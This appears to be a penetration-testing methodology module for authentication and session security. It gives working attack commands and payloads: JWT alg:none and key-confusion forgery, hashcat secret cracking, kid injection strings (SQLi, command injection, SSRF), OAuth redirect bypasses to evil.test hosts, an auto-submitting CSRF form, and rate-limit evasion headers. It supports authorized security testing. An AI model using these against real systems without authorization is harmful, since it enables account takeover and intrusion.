# Session and Authentication Module

Covers: authentication flow mapping, JWT, OAuth/OIDC, SAML, API keys, cookies, session lifecycle, password reset, MFA, CSRF, forced browsing, method/path normalization bypasses, credential attacks, and account recovery flaws.

## Goals

- Determine how identity is established, represented, refreshed, revoked, and authorized.
- Test whether authentication controls can be bypassed, forged, replayed, downgraded, or confused.
- Prove impact with test accounts and safe PoCs.

## Authentication Flow Inventory

Map every auth-related flow:

- Login, logout, registration, invitation, account activation
- Password reset, email change, phone change
- MFA enrollment, MFA challenge, backup codes, recovery codes
- OAuth/OIDC authorization code, implicit, hybrid, device code, client credentials
- SAML SSO, IdP-initiated and SP-initiated flows
- API keys, personal access tokens, service tokens
- Refresh tokens and session renewal
- Admin impersonation or support-user login features

Record:

```markdown
| Flow | Endpoint | Method | Token/Cookie | CSRF | Rate Limit | Notes |
|---|---|---|---|---|---|---|
| login | /api/login | POST | session cookie | no | 5/min | JSON body |
```

## JWT Testing

### Decode and Inspect

```bash
# Decode JWT header and payload
openghost bash 'TOKEN="<JWT>"; echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq .; echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .'

# jwt_tool inspection
openghost run jwt_tool <JWT>
```

Check header fields:

- `alg` - algorithm, especially `none`, `HS256`, `RS256`, `ES256`
- `kid` - key identifier; test path traversal, SQLi, SSRF, command injection only if behavior suggests key lookup
- `jku`, `jwk`, `x5u`, `x5c` - remote or embedded key trust
- `typ`, `cty` - nested token handling

Check claims:

- `sub`, `uid`, `user_id`, `account_id`, `tenant_id`, `org_id`
- `role`, `roles`, `admin`, `isAdmin`, `scope`, `permissions`
- `iss`, `aud`, `exp`, `nbf`, `iat`, `jti`

### `alg:none` Attack

Set `alg` to `none`, remove the signature, and keep the trailing dot.

```text
header.payload.
```

```bash
openghost run jwt_tool <JWT> -X a
```

Try case variations if the implementation is old: `none`, `None`, `NONE`, `nOnE`.

### Algorithm Confusion: RS256 to HS256

If a token uses an asymmetric algorithm, attempt to sign an HS256 token with the public key as the HMAC secret.

```bash
# Obtain public key from JWKS or certificate
openghost bash 'curl -s https://<target>/.well-known/jwks.json | jq .'
openghost bash 'openssl s_client -connect <target>:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > public_key.pem'

# jwt_tool confusion attack
openghost run jwt_tool <JWT> -X k -pk public_key.pem
```

Confirmed only if the forged token is accepted by a protected endpoint.

### Weak HMAC Secret

```bash
openghost run jwt_tool <JWT> -C -d /usr/share/wordlists/rockyou.txt
openghost bash 'printf "%s\n" "<JWT>" > /tmp/jwt.txt && hashcat -m 16500 /tmp/jwt.txt /usr/share/wordlists/rockyou.txt --quiet'
```

If cracked, validate by changing a harmless claim first, then a privilege claim with a test account.

### `kid` Injection

Potential payload classes:

```text
Path traversal: ../../../../dev/null
Empty key: /dev/null
SQLi: key1' UNION SELECT 'secret'--
SSRF: http://127.0.0.1:8080/key
Command injection: key1|id
```

Only report after proving the token verifier uses `kid` unsafely.

### `jku` / `x5u` Header Injection

If the server trusts a remote JWKS URL from the token header, host an attacker-controlled JWKS and sign a token with the matching private key. This is confirmed only if the app fetches the key and accepts the forged token.

### Claim Tampering

Try modifying claims without changing signature first. If the app accepts unsigned or unverified claims, test:

```json
{"role":"admin"}
{"roles":["admin"]}
{"isAdmin":true}
{"tenant_id":"other-tenant"}
{"scope":"admin read:all write:all"}
```

## OAuth and OIDC Testing

### Discovery

```bash
openghost bash 'curl -s https://<auth-host>/.well-known/openid-configuration | jq .'
```

Record:

- `authorization_endpoint`, `token_endpoint`, `jwks_uri`, `userinfo_endpoint`
- supported grants, response types, scopes, PKCE methods
- registered redirect URI behavior

### Redirect URI Bypasses

Test only against clients in scope.

```text
https://app.example.com.evil.test/callback
https://app.example.com@evil.test/callback
https://app.example.com/callback/../evil
https://app.example.com/callback%2eevil.test
https://app.example.com/callback?next=https://evil.test
https://app.example.com/callback#https://evil.test
http://app.example.com/callback
https://APP.EXAMPLE.COM/callback
https://app.example.com/callback.evil
```

High impact when authorization codes or tokens can be delivered to attacker-controlled infrastructure.

### State and CSRF

Test:

- Missing `state`
- Empty `state`
- Predictable `state`
- Reuse another user's `state`
- Reuse old `state`
- State not bound to session

### PKCE and Code Handling

Test:

- Missing PKCE on public clients
- `code_challenge_method=plain` accepted
- Code reuse
- Code not bound to redirect URI
- Code not bound to client ID
- Authorization code leakage through Referer

### Scope Escalation

Request unexpected scopes:

```text
openid profile email admin offline_access read:all write:all
```

Compare granted scope to requested scope and user privileges.

## SAML Testing

Review SAML only when in scope and test accounts are available.

Check:

- Assertion signature validation
- Signature wrapping
- Unsigned response or unsigned assertion acceptance
- `AudienceRestriction` validation
- `Recipient` and `Destination` validation
- `NotBefore` / `NotOnOrAfter` handling
- NameID or attribute tampering
- IdP-initiated login without RelayState validation

Evidence should include redacted SAML response, modified field, accepted session, and exact role/identity obtained.

## Session Management

### Cookie Security

```bash
openghost bash 'curl -s -I https://<target>/login | grep -i set-cookie'
```

Check:

- `Secure`
- `HttpOnly`
- `SameSite`
- domain and path scope
- expiration and persistence
- duplicate cookies with same name on different paths/domains

### Lifecycle Tests

- Session fixation: set cookie before login; verify if same value remains after login.
- Rotation after privilege change: login, MFA completion, role elevation.
- Logout invalidation: replay old cookie/token after logout.
- Password reset invalidation: old sessions should be revoked or risk-assessed.
- Refresh token rotation: reuse old refresh token and check if accepted.
- Concurrent sessions: verify policy matches documented behavior.

## CSRF Testing

Target state-changing actions:

- password/email/phone change
- payment/transfer/order/refund
- API key generation/deletion
- invite user, role change, tenant change
- OAuth account linking

Test token controls:

1. Remove CSRF token.
2. Use an empty token.
3. Use another user's token.
4. Reuse an expired token.
5. Use token from another endpoint.
6. Change `Content-Type` from JSON to form or text/plain.
7. Change POST to GET if the action supports it.

PoC template:

```html
<form action="https://target.example/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@example.test">
</form>
<script>document.forms[0].submit()</script>
```

CSRF is stronger when SameSite cookies allow the request and the action has material impact.

## Authentication Bypass

### Forced Browsing

```bash
openghost run ffuf -u https://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403
openghost bash 'curl -s -o /dev/null -w "%{http_code}\n" https://<target>/admin'
openghost bash 'curl -s -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer invalid" https://<target>/admin'
```

### Method Bypass

```bash
openghost bash 'for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do echo -n "$m "; curl -s -o /dev/null -w "%{http_code}\n" -X $m https://<target>/admin; done'
```

### Method Override

```bash
openghost bash 'curl -s -X POST -H "X-HTTP-Method-Override: DELETE" https://<target>/api/users/123'
```

### Path Normalization

```text
/admin
/Admin
/admin/
/admin/.
/./admin
/%61dmin
/admin..;/
/admin%2f
/admin%252f
```

## Credential and Rate Limit Testing

Do not run broad credential attacks unless explicitly authorized.

Safe checks:

- Account lockout exists and unlock policy is documented.
- Rate limits apply across IP, username, device, and endpoint variations.
- Login errors do not enumerate valid users.
- Password reset does not reveal account existence.
- MFA challenge cannot be brute-forced or bypassed by direct URL access.

Rate limit bypass headers:

```text
X-Forwarded-For
X-Real-IP
X-Originating-IP
Forwarded
Client-IP
X-Client-IP
```

## Reporting Checklist

- Token/cookie sample with secrets redacted
- Modified request and response
- Which user/role was obtained or affected
- Why validation failed
- Exact endpoint that accepted the bypass
- Reproduction with test accounts only
- Remediation: strict algorithm allowlist, key pinning, PKCE, token binding, CSRF validation, secure cookie config, session rotation
